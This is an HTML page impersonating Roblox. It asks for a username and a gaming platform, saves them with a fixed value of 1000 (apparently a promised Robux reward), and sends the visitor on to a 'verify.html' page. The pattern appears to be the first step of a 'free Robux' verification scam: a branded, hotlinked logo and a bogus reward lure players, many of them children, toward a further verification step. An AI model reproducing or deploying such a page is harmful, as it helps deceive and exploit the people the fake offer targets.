<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Roblox players</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  :root {
    --accent:#7b2cff;
    --accent-dark:#5a1fd1;
    --radius:20px;
  }
  body {
    margin:0; font-family:Inter,sans-serif;
    background:#f3f4f6;
    display:grid; place-items:center;
    min-height:100vh;
  }
  .card {
    width:min(420px, 92vw);
    background:#fff;
    border-radius:var(--radius);
    padding:28px 20px 34px;
    border:3px solid var(--accent);
    box-shadow:0 14px 30px rgba(123,44,255,.25);
    text-align:center;
    position:relative;
  }
  .brand-bar {
    position:absolute;
    left:50%; top:-30px; transform:translateX(-50%);
    background:#fff; border:3px solid var(--accent);
    border-radius:16px; padding:8px 18px;
    box-shadow:0 8px 20px rgba(123,44,255,.25);
  }
  .brand {height:34px;}
  h1 {margin:36px 0 18px;}
  
  .label {font-weight:700; text-align:left; margin:14px 0 8px;}
  
  .input-wrap {
    display:flex; align-items:center;
    background:#f7f7fc;
    border:2px solid #e1e1ec;
    border-radius:var(--radius);
    margin-bottom:18px;
    padding:10px 14px;
  }
  .input-wrap svg {
    flex-shrink:0; fill:#7b2cff; margin-right:10px;
    width:24px; height:24px; /* ✅ حجم مضبوط */
  }
  .input-wrap input {
    border:none; outline:none; background:transparent;
    flex:1; font-size:16px;
  }
  
  .platforms {
    display:flex; justify-content:center; gap:16px; margin-top:8px;
  }
  .btn-pl {
    width:64px; height:64px; background:#f5f6fa;
    border:2px solid #ddd; border-radius:16px;
    display:grid; place-items:center;
    cursor:pointer; transition:.25s;
  }
  .btn-pl svg {width:28px; height:28px; fill:#7b2cff;}
  .btn-pl.active {
    background:var(--accent);
    border-color:#fff;
    box-shadow:0 0 15px rgba(123,44,255,.8), 0 0 25px rgba(123,44,255,.4);
  }
  .btn-pl.active svg {fill:#fff;}
  
  .cta {
    margin-top:24px;
    width:100%; height:60px;
    border:none; border-radius:16px;
    background:linear-gradient(180deg,var(--accent),var(--accent-dark));
    color:#fff; font-weight:900; font-size:20px;
    cursor:pointer; box-shadow:0 10px 20px rgba(123,44,255,.4);
  }
  .cta:disabled {opacity:.5; cursor:not-allowed;}
</style>
</head>
<body>
  <section class="card">
    <div class="brand-bar">
      <!-- ✨ غير رابط اللوجو من هنا -->
      <img class="brand" src="https://s3-us-west-2.amazonaws.com/axomo/mm/axomo/6858/users/2ea6e407-5554-46f9-903d-159ceaa68219/logo-roblox-black-full-3-web.png" alt="Roblox">
    </div>
    <h1>Roblox</h1>
    
    <div class="label">USERNAME:</div>
    <div class="input-wrap">
      <!-- أيقونة يوزر مضبوطة -->
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.4c-3.2 0-9.5 1.6-9.5 4.9v2.4h19v-2.4c0-3.3-6.3-4.9-9.5-4.9z"/></svg>
      <input id="username" type="text" placeholder="e.g., Builder07">
    </div>
    
    <div class="label">YOUR PLATFORM</div>
    <div class="platforms" id="platforms">
      <div class="btn-pl" data-val="windows">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 3l9-1.3v9.6H2V3zm9 9.7V22L2 20.7V12.7h9zm2-.7h9v11l-9 1.3V12zm0-1.3V2l9 1.3v8.4h-9z"/></svg>
      </div>
      <div class="btn-pl" data-val="xbox">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm-5.2 4.6l5.2 5.2 5.2-5.2a8 8 0 01-10.4 0zM4.6 6.8A8 8 0 0112 4a8 8 0 017.4 2.8l-5.2 5.2-2.2-2.2-2.2 2.2-5.2-5.2z"/></svg>
      </div>
      <div class="btn-pl" data-val="android">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4V2h-2v2h-6V2H7v2C5.3 4 4 5.3 4 7v11a2 2 0 002 2h12a2 2 0 002-2V7c0-1.7-1.3-3-3-3z"/></svg>
      </div>
      <div class="btn-pl" data-val="ios">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16.4 1.9c.9-.6 1.8-1 2.8-1 .1 1-.2 2-1 2.9s-1.8 1.5-2.8 1.4c-.1-1 .3-2 1-3.3zM12 6c2.1 0 3.6 1 4.6 1 1.1 0 2.9-1.1 4.3-1 .1 1.9-.5 3.6-1.2 4.7-1 1.7-2.4 3.8-4.3 3.8-1 0-1.7-.7-3-1.3-1.3-.6-2.5-1.2-3.5-1.2-1.1 0-2.3.6-3.2 1.8-1.1 1.5-1.7 3.6-1.5 5.6 1.6.1 3.2-1 4.2-1.9 1-.9 2-1.8 3.3-1.8 1.2 0 1.8.6 3.2 1.2 1.3.6 2.7 1.3 4.1 1.2.5-1.6.8-3.2.8-4.9 0-2.2-.6-4.5-2.1-6.1C15.2 7.5 13.6 6 12 6z"/></svg>
      </div>
    </div>
    
    <button id="continueBtn" class="cta" disabled>CONTINUE</button>
  </section>

<script>
  const username=document.getElementById('username');
  const continueBtn=document.getElementById('continueBtn');
  const platformBtns=document.querySelectorAll('.btn-pl');
  let selectedPlatform=null;
  
  platformBtns.forEach(btn=>{
    btn.onclick=()=>{
      platformBtns.forEach(b=>b.classList.remove('active'));
      btn.classList.add('active');
      selectedPlatform=btn.dataset.val;
      validate();
    };
  });
  function validate(){
    continueBtn.disabled = !(username.value.trim().length>2 && selectedPlatform);
  }
  username.oninput=validate;
  
  continueBtn.onclick=()=>{
    const u=username.value.trim();
    localStorage.setItem('rbx_entry', JSON.stringify({u, p:selectedPlatform, r:1000}));
    location.href="verify.html?u="+encodeURIComponent(u)+"&r=1000";
  }
</script>
</body>
</html>
